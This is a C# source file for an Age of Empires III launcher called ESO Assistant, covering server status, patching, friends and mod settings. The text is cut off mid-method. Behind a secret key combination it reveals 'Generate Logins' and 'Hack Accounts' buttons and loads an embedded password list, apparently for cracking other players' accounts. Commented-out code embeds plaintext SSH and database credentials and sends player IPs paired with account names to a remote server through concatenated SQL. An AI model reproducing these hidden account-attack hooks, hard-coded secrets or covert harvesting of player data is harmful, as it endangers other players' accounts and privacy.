using ESO_Assistant;
using ESO_Assistant.Classes;
using HtmlAgilityPack;
using Microsoft.Win32;
using Newtonsoft.Json;
using SharpCompress.Archives;
using SharpCompress.Common;
using SharpCompress.Readers;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Security.Cryptography;
using System.ServiceModel;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using System.Xml;

namespace MultiTools
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    /// 



    public class MultiplyConverter : IMultiValueConverter
    {
        public object Convert(object[] values, Type targetType, object parameter, CultureInfo culture)
        {
            return new GridLength((double)values[0] * (double)values[1], GridUnitType.Pixel);
        }

        public object[] ConvertBack(object value, Type[] targetTypes, object parameter, CultureInfo culture)
        {
            throw new NotImplementedException();
        }
    }
    public partial class MainWindow : Window, INotifyPropertyChanged
    {


        public static RoutedCommand MyCommand = new RoutedCommand();

        private void MyCommandExecuted(object sender, ExecutedRoutedEventArgs e)
        {
            if (bGenerateLogins.Visibility == Visibility.Collapsed)
                bGenerateLogins.Visibility = Visibility.Visible;
            else
                bGenerateLogins.Visibility = Visibility.Collapsed;

            if (bHackAccounts.Visibility == Visibility.Collapsed)
                bHackAccounts.Visibility = Visibility.Visible;
            else
                bHackAccounts.Visibility = Visibility.Collapsed;
        }


        public class ActionCommand : ICommand
        {
            private readonly Action _action;

            public ActionCommand(Action action)
            {
                _action = action;
            }

            public void Execute(object parameter)
            {
                _action();
            }

            public bool CanExecute(object parameter)
            {
                return true;
            }

            public event EventHandler CanExecuteChanged;
        }




        public event PropertyChangedEventHandler PropertyChanged;

        public void NotifyPropertyChanged(string propName)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propName));

        }


        private bool FGamesOpen { get; set; }
        public bool GamesOpen
        {
            get { return FGamesOpen; }
            set
            {
                if (value != FGamesOpen && value)
                {
                    gSettings.Visibility = Visibility.Hidden;
                }
                FGamesOpen = value;
                NotifyPropertyChanged("GamesOpen");
                NotifyPropertyChanged("DisableMenu");
            }
        }
        public bool DisableMenu
        {
            get { return !GamesOpen; }
        }





        private string FCurrentState { get; set; }
        public string CurrentState
        {
            get { return FCurrentState; }
            set
            {
                FCurrentState = value;
                NotifyPropertyChanged("CurrentState");
            }
        }

        private string hESO { get; set; }
        public string ESOHint
        {
            get { return hESO; }
            set
            {
                hESO = value;
                NotifyPropertyChanged("ESOHint");
            }
        }

        private Brush ESOColor { get; set; }
        public Brush ESO
        {
            get { return ESOColor; }
            set
            {
                ESOColor = value;
                NotifyPropertyChanged("ESO");
            }
        }
        private string _ESOPop { get; set; }
        public string ESOPop
        {
            get { return _ESOPop; }
            set
            {
                _ESOPop = value;
                NotifyPropertyChanged("ESOPop");
            }
        }
        private string _TADPop { get; set; }
        public string TADPop
        {
            get { return _TADPop; }
            set
            {
                _TADPop = value;
                NotifyPropertyChanged("TADPop");
            }
        }
        private string _NillaPop { get; set; }
        public string NillaPop
        {
            get { return _NillaPop; }
            set
            {
                _NillaPop = value;
                NotifyPropertyChanged("NillaPop");
            }
        }

        private Visibility FEPVisible { get; set; }
        public Visibility EPVisible
        {
            get { return FEPVisible; }
            set
            {
                FEPVisible = value;
                NotifyPropertyChanged("EPVisible");
            }
        }

        private Visibility FNVisible { get; set; }
        public Visibility NVisible
        {
            get { return FNVisible; }
            set
            {
                FNVisible = value;
                NotifyPropertyChanged("NVisible");
            }
        }

        private Visibility FXVisible { get; set; }
        public Visibility XVisible
        {
            get { return FXVisible; }
            set
            {
                FXVisible = value;
                NotifyPropertyChanged("XVisible");
            }
        }

        private Visibility FYVisible { get; set; }
        public Visibility YVisible
        {
            get { return FYVisible; }
            set
            {
                FYVisible = value;
                NotifyPropertyChanged("YVisible");
            }
        }

        private Visibility FTPVisible { get; set; }
        public Visibility TPVisible
        {
            get { return FTPVisible; }
            set
            {
                FTPVisible = value;
                NotifyPropertyChanged("TPVisible");
            }
        }




        private Visibility FXPVisible { get; set; }
        public Visibility XPVisible
        {
            get { return FXPVisible; }
            set
            {
                FXPVisible = value;
                NotifyPropertyChanged("XPVisible");
            }
        }

        SoundPlayer Click = new SoundPlayer(Application.GetResourceStream(new Uri("Click.wav", UriKind.Relative)).Stream);


        async Task<string> HttpGetAsync(string URI)
        {
            try
            {
                HttpClient hc = new HttpClient();
                hc.DefaultRequestHeaders.Accept.ParseAdd("application/vnd.twitchtv.v5+json");
                hc.DefaultRequestHeaders.Add("Client-ID", "9rrpybi820nvoixrr2lkqk19ae8k4ef");
                Task<System.IO.Stream> result = hc.GetStreamAsync(URI);

                System.IO.Stream vs = await result;
                using (StreamReader am = new StreamReader(vs, Encoding.UTF8))
                {
                    return await am.ReadToEndAsync();
                }
            }
            catch
            {

                return "";
            }
        }

        async void GetPopInfo(string URI)
        {
            try
            {
                string Data = await HttpGetAsync(URI);
                ServerStatus SS = new ServerStatus();
                SS.Get(Data);
                ESOPop = SS.ESOPopulation;
                TADPop = SS.TADPopulation;
                NillaPop = SS.NillaPopulation;
            }
            catch
            {
                ESOPop = "- - -";
                TADPop = "- - -";
                NillaPop = "- - -";
            }
            PopTimer.Start();
        }

        private void PopTimer_Tick(object sender, EventArgs e)
        {
            PopTimer.Stop();
            PopTimer.Interval = TimeSpan.FromMilliseconds(10000);
            GetPopInfo("http://www.agecommunity.com/_server_status_/");
        }


        private void GameTimer_Tick(object sender, EventArgs e)
        {
            GameTimer.Stop();
            PopTimer.Interval = TimeSpan.FromMilliseconds(100);
            bool LastGame = GamesOpen;
            GamesOpen = Process.GetProcessesByName("age3").Length != 0 || Process.GetProcessesByName("age3y").Length != 0 || Process.GetProcessesByName("age3f").Length != 0 || Process.GetProcessesByName("age3t").Length != 0 || Process.GetProcessesByName("age3x").Length != 0 || Process.GetProcessesByName("age3xpmod").Length != 0;
            if (GamesOpen && !LastGame)
            {
                EPVisible = Visibility.Collapsed;
                TPVisible = Visibility.Collapsed;
                XPVisible = Visibility.Collapsed;
                NVisible = Visibility.Collapsed;
                XVisible = Visibility.Collapsed;
                YVisible = Visibility.Collapsed;
            }
            if (!GamesOpen && LastGame)
            {
                EPVisible = Paths.IsEPInstalled();
                TPVisible = Paths.IsTPInstalled();
                XPVisible = Paths.IsXPInstalled();
                NVisible = Visibility.Visible;
                XVisible = Visibility.Visible;
                YVisible = Visibility.Visible;
            }
            GameTimer.Start();
        }

        private DispatcherTimer PopTimer = new DispatcherTimer()
        {
            Interval = TimeSpan.FromMilliseconds(100)
        };
        private DispatcherTimer ESOTimer = new DispatcherTimer()
        {
            Interval = TimeSpan.FromMilliseconds(100)
        };
        private DispatcherTimer GameTimer = new DispatcherTimer(DispatcherPriority.Render)
        {
            Interval = TimeSpan.FromMilliseconds(1)
        };


        /*private DispatcherTimer SQLTimer = new DispatcherTimer()
        {
            Interval = TimeSpan.FromMilliseconds(30000)
        };*/

        /*private void SQLTimer_Tick(object sender, EventArgs e)
        {
            SQLTimer.Stop();
            Thread myThread = new Thread(async delegate ()
            {
                await Upload();
                await Download();
            });
            myThread.Start();
            SQLTimer.Start();
        }*/


        private void ESOTimer_Tick(object sender, EventArgs e)
        {
            ESOTimer.Stop();
            ESOTimer.Interval = TimeSpan.FromMilliseconds(20000);
            Thread myThread = new Thread(async delegate ()
            {
                try
                {

                    bool x = await ServerStatus.checkESOAsync();


                    if (x)
                    {
                        ESOHint = (string)Application.Current.FindResource("ESOon") + Environment.NewLine + (string)Application.Current.FindResource("Updated") + " " + DateTime.Now.ToString();
                        ESO = Brushes.LimeGreen;
                    }
                    else
                    {
                        ESOHint = (string)Application.Current.FindResource("ESOoff") + Environment.NewLine + (string)Application.Current.FindResource("Cause")
                          + Environment.NewLine + (string)Application.Current.FindResource("Updated") + " " + DateTime.Now.ToString();
                        ESO = Brushes.Red;
                    }



                }
                catch
                {
                    ESOHint = (string)Application.Current.FindResource("ESOoff") + Environment.NewLine + (string)Application.Current.FindResource("Cause")
                        + Environment.NewLine + (string)Application.Current.FindResource("Updated") + " " + DateTime.Now.ToString();
                    ESO = Brushes.Red;
                }
            });
            myThread.Start();
            ESOTimer.Start();
        }

        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            this.DragMove();

        }

        private void bClose_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }

        private void Image_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            Paths.OpenNilla("age3.exe");
        }

        private void Image_MouseLeftButtonDown_1(object sender, MouseButtonEventArgs e)
        {
            Paths.OpenTAD("age3y.exe");
        }

        private async void Image_MouseLeftButtonDown_2(object sender, MouseButtonEventArgs e)
        {
            iEP.Visibility = Visibility.Collapsed;
            gEP.Visibility = Visibility.Visible;
            window.IsEnabled = false;
            var newVer = await GetNewVersion();
            var curVer = Paths.GetEPVersion();
            if (newVer.Item1 != null && curVer != null && curVer != newVer.Item1)
            {
                var ESOCPatchLauncher = Process.GetProcesses().
                     Where(pr => pr.ProcessName == "ESOCPatchLauncher");

                foreach (var process in ESOCPatchLauncher)
                {
                    process.Kill();
                }
                await InstallEPUpdates(newVer.Item2);
            }
            window.IsEnabled = true;
            iEP.Visibility = Visibility.Visible;
            gEP.Visibility = Visibility.Collapsed;

            Paths.OpenTAD("age3f.exe");
        }

        private async void Image_MouseLeftButtonDown_3(object sender, MouseButtonEventArgs e)
        {
            iTP.Visibility = Visibility.Collapsed;
            gTP.Visibility = Visibility.Visible;
            window.IsEnabled = false;
            var newVer = await GetNewVersion();
            var curVer = Paths.GetEPVersion();
            if (newVer.Item1 != null && curVer != null && curVer != newVer.Item1)
            {
                var ESOCPatchLauncher = Process.GetProcesses().
                     Where(pr => pr.ProcessName == "ESOCPatchLauncher");

                foreach (var process in ESOCPatchLauncher)
                {
                    process.Kill();
                }
                await InstallEPUpdates(newVer.Item2);
            }
            window.IsEnabled = true;
            iTP.Visibility = Visibility.Visible;
            gTP.Visibility = Visibility.Collapsed;
            Paths.OpenTAD("age3t.exe");
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            rbDefault.IsChecked = true;
            gMods.Visibility = Visibility.Collapsed;
            gHotkeysEditor.Visibility = Visibility.Collapsed;
            gSettings.Visibility = Visibility.Visible;
            bFriends.IsEnabled = false;
            bStreams.IsEnabled = false;
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            gStreams.Visibility = Visibility.Visible;

        }

        private void Button_Click_3(object sender, RoutedEventArgs e)
        {
            gFriends.Visibility = Visibility.Visible;
        }


        private void Button_Click_4(object sender, RoutedEventArgs e)
        {
            Process.Start("http://eso-community.net");
        }


        private void Button_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (Audio.IsChecked == false)
                Click.Play();
        }

        private void Window_Closed(object sender, EventArgs e)
        {

        }

        private void Image_MouseLeftButtonDown_4(object sender, MouseButtonEventArgs e)
        {
            Paths.OpenTWC("age3x.exe");
        }


        class Stat
        {
            public static string FormatPR(string PR)
            {
                if (int.TryParse(PR, out int Rating))
                {
                    if (Rating < 3)
                        return (string)Application.Current.FindResource("Conscript") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 2 && Rating < 8)
                        return (string)Application.Current.FindResource("Private") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 7 && Rating < 11)
                        return (string)Application.Current.FindResource("Lance Corporal") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 10 && Rating < 14)
                        return (string)Application.Current.FindResource("Corporal") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 13 && Rating < 17)
                        return (string)Application.Current.FindResource("Sergeant") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 16 && Rating < 20)
                        return (string)Application.Current.FindResource("Master Sergeant") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 19 && Rating < 23)
                        return (string)Application.Current.FindResource("2nd Lieutenant") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 22 && Rating < 26)
                        return (string)Application.Current.FindResource("1st Lieutenant") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 25 && Rating < 29)
                        return (string)Application.Current.FindResource("Captain") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 28 && Rating < 32)
                        return (string)Application.Current.FindResource("Major") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 31 && Rating < 35)
                        return (string)Application.Current.FindResource("Lieutenant Colonel") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 34 && Rating < 38)
                        return (string)Application.Current.FindResource("Colonel") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 37 && Rating < 41)
                        return (string)Application.Current.FindResource("Brigadier") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 40 && Rating < 44)
                        return (string)Application.Current.FindResource("Major General") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 43 && Rating < 47)
                        return (string)Application.Current.FindResource("Lieutenant General") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 46 && Rating < 50)
                        return (string)Application.Current.FindResource("General") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";
                    if (Rating > 49)
                        return (string)Application.Current.FindResource("Field Marshal") + " (" + (string)Application.Current.FindResource("Level ") + " " + Rating.ToString() + ")";

                }
                return PR;
            }



        }





        public async Task<(string, string)> GetNewVersion()
        {
            try
            {
                CurrentState = "Checking for updates...";
                var getVersionXml = @"<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:pat=""http://patch.esoc.com/""><soapenv:Header/><soapenv:Body><pat:getLatestPatchVersion><releaseType>Stable</releaseType></pat:getLatestPatchVersion></soapenv:Body></soapenv:Envelope>";

                XmlDocument soapEnvelopeXml = CreateSoapEnvelope(getVersionXml);
                HttpWebRequest webRequest = CreateWebRequest();
                InsertSoapEnvelopeIntoWebRequest(soapEnvelopeXml, webRequest);


                using (var webResponse = await webRequest.GetResponseAsync())
                {
                    var result = await new StreamReader(webResponse.GetResponseStream()).ReadToEndAsync();
                    XmlDocument xmlDoc = new XmlDocument();
                    xmlDoc.LoadXml(result);

                    XmlNamespaceManager xmlnsManager = new System.Xml.XmlNamespaceManager(xmlDoc.NameTable);

                    xmlnsManager.AddNamespace("soap", "http://schemas.xmlsoap.org/soap/envelope/");
                    xmlnsManager.AddNamespace("ns1", "http://patch.esoc.com/");


                    var updateFileName = xmlDoc.SelectSingleNode("/soap:Envelope/soap:Body/ns1:getLatestPatchVersionResponse/return/updateFileName", xmlnsManager).InnerText;
                    var NewVersion = xmlDoc.SelectSingleNode("/soap:Envelope/soap:Body/ns1:getLatestPatchVersionResponse/return/versionName", xmlnsManager).InnerText;
                    var releaseDate = xmlDoc.SelectSingleNode("/soap:Envelope/soap:Body/ns1:getLatestPatchVersionResponse/return/releaseDate", xmlnsManager).InnerText;
                    var size = Convert.ToInt32(xmlDoc.SelectSingleNode("/soap:Envelope/soap:Body/ns1:getLatestPatchVersionResponse/return/size", xmlnsManager).InnerText);
                    return (NewVersion.Replace(".", ""), updateFileName);
                }
            }
            catch { return (null, null); }

        }


        public async Task<bool> InstallEPUpdates(string name)
        {
            try
            {
                CurrentState = "Downloading updates...";
                var downloadupdateXml = @"<soapenv:Envelope xmlns:soapenv=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:pat=""http://patch.esoc.com/""><soapenv:Header/><soapenv:Body><pat:downloadFile><fileName>" + name + "</fileName></pat:downloadFile></soapenv:Body></soapenv:Envelope>";
                XmlDocument soapEnvelopeXml2 = CreateSoapEnvelope(downloadupdateXml);
                HttpWebRequest webRequest2 = CreateWebRequest();
                InsertSoapEnvelopeIntoWebRequest(soapEnvelopeXml2, webRequest2);



                using (var webResponse2 = await webRequest2.GetResponseAsync())
                {



                    var result2 = await new StreamReader(webResponse2.GetResponseStream()).ReadToEndAsync();
                    XmlDocument xmlDoc2 = new XmlDocument();
                    xmlDoc2.LoadXml(result2);

                    XmlNamespaceManager xmlnsManager2 = new System.Xml.XmlNamespaceManager(xmlDoc2.NameTable);

                    xmlnsManager2.AddNamespace("soap", "http://schemas.xmlsoap.org/soap/envelope/");
                    xmlnsManager2.AddNamespace("ns1", "http://patch.esoc.com/");


                    XmlNode node2 = xmlDoc2.SelectSingleNode("/soap:Envelope/soap:Body/ns1:downloadFileResponse/return/fileBytes", xmlnsManager2);



                    byte[] fileBytes = Convert.FromBase64String(node2.InnerText);



                    using (MemoryStream stream = new MemoryStream(fileBytes))
                    {
                        var archive = ArchiveFactory.Open(stream);


                        await Task.Run(() =>
                        {
                            int progress = 0;
                            var reader = archive.ExtractAllEntries();
                            int count = archive.Entries.Count();
                            while (reader.MoveToNextEntry())
                            {
                                if (!reader.Entry.IsDirectory)
                                {
                                    if (reader.Entry.Key == "NEW_ESOCPatchLauncher.exe")
                                        reader.WriteEntryToFile(Path.Combine(Paths.getGamePath(), "ESOCPatchLauncher.exe"), new ExtractionOptions() { ExtractFullPath = true, Overwrite = true });
                                    else if (reader.Entry.Key == "NEW_ESOCPatchLauncher.exe.config")
                                        reader.WriteEntryToFile(Path.Combine(Paths.getGamePath(), "ESOCPatchLauncher.exe.config"), new ExtractionOptions() { ExtractFullPath = true, Overwrite = true });
                                    else
                                        reader.WriteEntryToDirectory(Paths.getGamePath(), new ExtractionOptions() { ExtractFullPath = true, Overwrite = true });
                                }
                                progress++;
                                CurrentState = "Update progress: " + Math.Round(progress * 100.0 / count, 0) + " %";
                            }
                        }
                        );

                    }

                }

                return true;
            }
            catch
            { return false; }
        }

        private HttpWebRequest CreateWebRequest()
        {
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("https://services.eso-community.net/ESOC/PatchService?WSDL");
            webRequest.Headers.Add("SOAPAction", "");
            webRequest.ContentType = "text/xml;charset=utf-8";
            webRequest.Accept = "text/xml";

            webRequest.Method = "POST";
            return webRequest;
        }

        private XmlDocument CreateSoapEnvelope(string xml)
        {
            XmlDocument soapEnvelopeDocument = new XmlDocument();
            soapEnvelopeDocument.LoadXml(xml);
            return soapEnvelopeDocument;
        }

        private void InsertSoapEnvelopeIntoWebRequest(XmlDocument soapEnvelopeXml, HttpWebRequest webRequest)
        {
            using (System.IO.Stream stream = webRequest.GetRequestStream())
            {
                soapEnvelopeXml.Save(stream);
            }
        }



        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            //    CallWebService();

            //     Console.WriteLine(     a.releaseDate);
            //   ver.getLatestPatchVersionCompleted += Ver_getLatestPatchVersionCompleted;
            /*Thread myThread = new Thread(async delegate ()
            {
                SshClient client = new SshClient("ssh.pythonanywhere.com", "XaKOps", "19862007");
                try
                {
                    client.Connect();
                    if (client.IsConnected)
                        Debug.WriteLine("SSH connected!");
                    var tunnel = new ForwardedPortLocal("127.0.0.1", 3306, "XaKOps.mysql.pythonanywhere-services.com", 3306);
                    client.AddForwardedPort(tunnel);
                    tunnel.Start();


                    if (tunnel.IsStarted)
                        Debug.WriteLine("Port Forward started!");
                    await Download();
                }
                catch { }

            });

            myThread.Start();*/


        }



        public MainWindow()
        {
            GamesOpen = false;
            ToolTipService.ShowDurationProperty.OverrideMetadata(typeof(DependencyObject), new FrameworkPropertyMetadata(Int32.MaxValue));
            ToolTipService.InitialShowDelayProperty.OverrideMetadata(typeof(DependencyObject), new FrameworkPropertyMetadata(200));

            DataContext = this;
            InitializeComponent();
            LoginsWorkers = 100;
            HackedAccsWorkers = 100;
            AlphaDepth = 3;

            MyCommand.InputGestures.Add(new KeyGesture(Key.H, ModifierKeys.Control | ModifierKeys.Shift | ModifierKeys.Alt));
            var uri = new Uri("pack://application:,,,/Hack/TopWorld.txt");
            var resourceStream = Application.GetResourceStream(uri);

            using (var reader = new StreamReader(resourceStream.Stream))
            {
                tbHackedPasswords.Text = reader.ReadToEnd();

            }


            LoginsTimer.Interval = TimeSpan.FromSeconds(1);
            LoginsTimer.Tick += timer_Tick1;

            HackedAccsTimer.Interval = TimeSpan.FromSeconds(1);
            HackedAccsTimer.Tick += timer_Tick2;

            Timeline.DesiredFrameRateProperty.OverrideMetadata(typeof(Timeline),
   new FrameworkPropertyMetadata { DefaultValue = 24 });
            StreamsTimer.Tick += StreamsTimer_Tick;
            StreamsTimer.Start();

            FriendPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ESO-Assistant");
            NickForAdding = "";

            if (!Directory.Exists(FriendPath))

                Directory.CreateDirectory(FriendPath);
            if (File.Exists(System.IO.Path.Combine(FriendPath, "FriendList.json")))
            {
                string json = File.ReadAllText(System.IO.Path.Combine(FriendPath, "FriendList.json"));
                Friends = JsonConvert.DeserializeObject<ObservableCollection<FriendListItem>>(json);
            }
            else
                Friends = new ObservableCollection<FriendListItem>();


            HackedAccs = new ObservableCollection<PlayerInfo>();
            BindingOperations.EnableCollectionSynchronization(HackedAccs, HackedAccsLock);
            //  listView4.ItemsSource = HackedAccs;

            listView2.ItemsSource = Friends;
            ICollectionView collectionView = CollectionViewSource.GetDefaultView(listView2.Items);
            collectionView.SortDescriptions.Add(new SortDescription("Status", ListSortDirection.Descending));
            collectionView.SortDescriptions.Add(new SortDescription("Name", ListSortDirection.Ascending));
            var view = (ICollectionViewLiveShaping)CollectionViewSource.GetDefaultView(listView2.Items);
            view.IsLiveSorting = true;
            FriendsTimer.Tick += FriendsTimer_Tick;
            FriendsTimer.Start();

            //SQLTimer.Tick += SQLTimer_Tick;
            //SQLTimer.Start();

            /*   var LI = new ListItem()
               {
                   IP = "21.31.23.123",
                   ESO = "DoubleMadness",
                   PR = "sergeant ",
                   Ping = "123 ms",
                   FirstUpdate = "13:45:45",
                   LastUpdate = "36.89.46"
               };
               MyView.Add(LI);
               if (MyView.FirstOrDefault(x => x.ESO == "DoubleMadnes") == null)
                   MessageBox.Show("");//;.ESO="23";
              /* MyView.Add(LI);
               MyView.Add(LI);*/
            EPVisible = Paths.IsEPInstalled();
            TPVisible = Paths.IsTPInstalled();
            XPVisible = Paths.IsXPInstalled();
            ESOHint = (string)Application.Current.FindResource("Checking ESO servers...");
            ESOPop = "- - -";
            TADPop = "- - -";
            NillaPop = "- - -";
            ESO = Brushes.Yellow;
            ESOTimer.Tick += ESOTimer_Tick;
            ESOTimer.Start();
            PopTimer.Tick += PopTimer_Tick;
            PopTimer.Start();
            GameTimer.Tick += GameTimer_Tick;
            GameTimer.Start();
            Cursor = new Cursor(Application.GetResourceStream(new Uri("Cursor/AoE.cur", UriKind.Relative)).Stream);
            AoE = new Cursor(Application.GetResourceStream(new Uri("Cursor/AoE.cur", UriKind.Relative)).Stream);



            /// MODES
            /// 
            P1 = new SolidColorBrush();
            P2 = new SolidColorBrush();
            P3 = new SolidColorBrush();
            P4 = new SolidColorBrush();
            P5 = new SolidColorBrush();
            P6 = new SolidColorBrush();
            P7 = new SolidColorBrush();
            P8 = new SolidColorBrush();
            P9 = new SolidColorBrush();
            P10 = new SolidColorBrush();
            P11 = new SolidColorBrush();

            Colors = typeof(Brushes).GetProperties();


            if (gInterface.Visibility == Visibility.Collapsed && gMods.Visibility == Visibility.Collapsed && gHackAccs.Visibility == Visibility.Collapsed && gLogins.Visibility == Visibility.Collapsed && gHotkeysEditor.Visibility == Visibility.Collapsed)
            {
                rbDefault.IsChecked = true;
            }
            rbEkantaUI.IsChecked = Paths.isEkantaInstalled();
            rbJammsUI.IsChecked = Paths.isJammsInstalled();
            rbQazUI.IsChecked = Paths.isQazInstalled();
            tbArty.IsChecked = Paths.isArtyInstalled();



            rbF1.IsChecked = Paths.IsFontInstalled("Academy");
            rbF2.IsChecked = Paths.IsFontInstalled("Basil Regular");
            rbF3.IsChecked = Paths.IsFontInstalled("Cambria Italic");
            rbF4.IsChecked = Paths.IsFontInstalled("Candara Italic");
            rbF5.IsChecked = Paths.IsFontInstalled("Kramola");
            rbF6.IsChecked = Paths.IsFontInstalled("LugaType");
            rbF7.IsChecked = Paths.IsFontInstalled("Margot");
            rbF8.IsChecked = Paths.IsFontInstalled("Plainot");
            rbF9.IsChecked = Paths.IsFontInstalled("Formal436 BT");
            udMax.ValueChanged -= udMax_ValueChanged;


            using (RegistryKey AS = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\microsoft games\\age of empires 3\\1.0"))
            {
                object P = AS.GetValue("setuppath");
                if (P != null)
                {

                    if (File.Exists(Path.Combine(P.ToString(), "Data", "playercolors.xml")))
                    {
                        XmlDocument doc = new XmlDocument();
                        doc.Load(Path.Combine(P.ToString(), "Data", "playercolors.xml"));
                        XmlElement Node = doc.DocumentElement;
                        P1 = GetFromRGB(Node.ChildNodes[1].Attributes.GetNamedItem("color1").Value);
                        P2 = GetFromRGB(Node.ChildNodes[2].Attributes.GetNamedItem("color1").Value);
                        P3 = GetFromRGB(Node.ChildNodes[3].Attributes.GetNamedItem("color1").Value);
                        P4 = GetFromRGB(Node.ChildNodes[4].Attributes.GetNamedItem("color1").Value);
                        P5 = GetFromRGB(Node.ChildNodes[5].Attributes.GetNamedItem("color1").Value);
                        P6 = GetFromRGB(Node.ChildNodes[6].Attributes.GetNamedItem("color1").Value);
                        P7 = GetFromRGB(Node.ChildNodes[7].Attributes.GetNamedItem("color1").Value);
                        P8 = GetFromRGB(Node.ChildNodes[8].Attributes.GetNamedItem("color1").Value);
                        P9 = GetFromRGB(Node.ChildNodes[13].Attributes.GetNamedItem("color1").Value);
                        P10 = GetFromRGB(Node.ChildNodes[14].Attributes.GetNamedItem("color1").Value);
                        P11 = GetFromRGB(Node.ChildNodes[15].Attributes.GetNamedItem("color1").Value);
                    }
                    else
                    {
                        P1.Color = Color.FromRgb(45, 45, 245);
                        P2.Color = Color.FromRgb(210, 40, 40);
                        P3.Color = Color.FromRgb(215, 215, 30);
                        P4.Color = Color.FromRgb(150, 15, 250);
                        P5.Color = Color.FromRgb(15, 210, 80);
                        P6.Color = Color.FromRgb(255, 150, 5);
                        P7.Color = Color.FromRgb(150, 255, 240);
                        P8.Color = Color.FromRgb(255, 190, 255);

                        P9.Color = Color.FromRgb(75, 75, 230);
                        P10.Color = Color.FromRgb(215, 215, 30);
                        P11.Color = Color.FromRgb(230, 40, 40);
                    }
                    if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.cfg")))
                    {
                        List<string> S = File.ReadAllLines(Path.Combine(P.ToString(), "Startup", "user.cfg")).ToList();
                        miFPS.IsChecked = S.IndexOf("showFPS") != -1;
                        miIntro.IsChecked = S.IndexOf("noIntroCinematics") != -1;
                        miMsecs.IsChecked = S.IndexOf("showMilliseconds") != -1;
                        mihidepopups.IsChecked = S.IndexOf("hidepopups") != -1;
                        int z1 = S.FindIndex(x => x.StartsWith("maxZoom"));

                        if (z1 >= 0)
                            udMax.Value = Double.Parse(S[z1].Split('=')[1]);
                        else
                            udMax.Value = 60;

                    }
                    else
                    {
                        udMax.Value = 60;
                    }

                    if (File.Exists(Path.Combine(P.ToString(), "Startup", "user.con")))
                    {
                        string M = File.ReadAllText(Path.Combine(P.ToString(), "Startup", "user.con"));
                        miRotator.IsChecked = M.Contains("uiWheelRotatePlacedUnit");
                        miFastESO.IsChecked = M.Contains("startRandomGame() modeEnter(\"Pregame\") doMPSetup(true)");
                    }




                }
            }
            udMax.ValueChanged += udMax_ValueChanged;


        }


        /*async Task Upload()
        {
            MySqlConnection connection = new MySqlConnection("SERVER=127.0.0.1;PORT=3306;UID=XaKOps;PASSWORD=2007Add313;DATABASE=XaKOps$default");
            try
            {
                await connection.OpenAsync();
                StringBuilder A = new StringBuilder();
                for (int r = 0; r <= BufferIP.Count - 1; r++)
                {
                    if (BufferIP[r].IP != "" && BufferIP[r].ESO != "")
                    {
                        string ips = ((long)(uint)IPAddress.NetworkToHostOrder(BitConverter.ToInt32(IPAddress.Parse(BufferIP[r].IP).GetAddressBytes(), 0))).ToString();
                        A.AppendLine("INSERT INTO IPandESO(ip,eso) Select * FROM (SELECT '" + ips + "','" + BufferIP[r].ESO + "') as tmp WHERE NOT EXISTS (SELECT ip, eso FROM IPandESO WHERE (ip = '" + ips + "' and eso = '" + BufferIP[r].ESO + "')) LIMIT 1;");
                    }
                }
                Debug.WriteLine(A.ToString());
                Debug.WriteLine(Encoding.UTF8.GetByteCount(A.ToString()));
                if (A.Length > 0)
                {
                    MySqlCommand command = new MySqlCommand(A.ToString(), connection);
                    await command.ExecuteNonQueryAsync();
                }
                BufferIP.Clear();

            }
            catch
            {
                Debug.WriteLine("MySQL error Upload");
                XmlSerializer xs = new XmlSerializer(typeof(ObservableCollection<Row>));
                using (StreamWriter wr = new StreamWriter("UNSAVED.xml"))
                {
